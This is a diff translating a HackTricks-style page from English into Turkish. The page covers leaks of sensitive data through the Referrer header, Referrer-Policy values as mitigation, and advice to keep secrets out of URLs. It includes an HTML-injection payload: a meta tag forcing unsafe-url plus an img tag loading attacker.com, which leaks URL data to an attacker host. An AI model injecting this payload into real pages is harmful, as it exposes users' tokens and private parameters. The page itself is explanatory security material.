@@ -1,17 +1,16 @@
 {{#include ./banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+# Referrer başlıkları ve politikası
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer, tarayıcılar tarafından önceki ziyaret edilen sayfayı belirtmek için kullanılan başlıktır.
 
-## Sensitive information leaked
+## Hassas bilgilerin sızdırılması
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir şekilde yönlendirebiliyorsa, en son GET isteği içindeki hassas bilgileri dışarıya aktarabilir.
 
-## Mitigation
+## Azaltma
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+Tarayıcının hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## Karşı Önlem
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu kullanması gerekir):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## Savunma
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+Hassas verileri asla GET parametreleri veya URL'deki yolların içine koymayın.
 
 {{#include ./banners/hacktricks-training.md}}
-
